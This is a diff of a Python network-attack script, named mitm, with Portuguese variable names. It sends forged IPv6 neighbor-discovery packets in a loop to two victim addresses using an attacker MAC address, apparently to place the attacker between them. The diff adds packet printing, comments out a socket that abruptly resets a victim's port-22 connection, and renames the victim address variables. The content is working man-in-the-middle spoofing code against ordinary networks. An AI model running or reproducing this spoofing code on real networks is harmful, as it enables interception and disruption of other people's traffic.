@@ -19,22 +19,25 @@ def mitm(ip_vitima01, ip_vitima02, mac_atacante):
 	pkt02 = ip02 / nd02 / lla02
 	
 	while True:
+		pkt01.show()
 		send(pkt01, iface = 'enp4s0')
+		pkt02.show()
 		send(pkt02, iface = 'enp4s0')
 		time.sleep(1)
 
-		s = socket.socket(socket.AF_INET6, socket.SOCK_STREAM, 0)
-		s.connect((ip_vitima01, 22))
-		l_onoff = 1
-		l_linger = 0
-		s.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER, struct.pack('ii', l_onoff, l_linger))
-		# send data here
-		s.close()
+#		s = socket.socket(socket.AF_INET6, socket.SOCK_STREAM, 0)
+#		s.connect((ip_vitima01, 22))
+#		l_onoff = 1
+#		l_linger = 0
+#		s.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER, struct.pack('ii', l_onoff, l_linger))
+#		# send data here
+#		s.close()
 
 		time.sleep(1)
 
-ipv6_vitima01 = "2001:db8:0:1:c966:e1f7:3ae8:76b9"
-ipv6_vitima02 = "2001:1bcd:123:1:ac02:ae48:93da:f43e"
+ip_vitima01 = "2001:db8:0:1:d1:89ec:891:eba3"
+ip_vitima02 = "2001:1bcd:123:1:4c75:483:eb42:ba9c"
+
 mac_atacante = "a4:1f:72:f5:90:50"
 
-mitm(ipv6_vitima01, ipv6_vitima02, mac_atacante)
+mitm(ip_vitima01, ip_vitima02, mac_atacante)
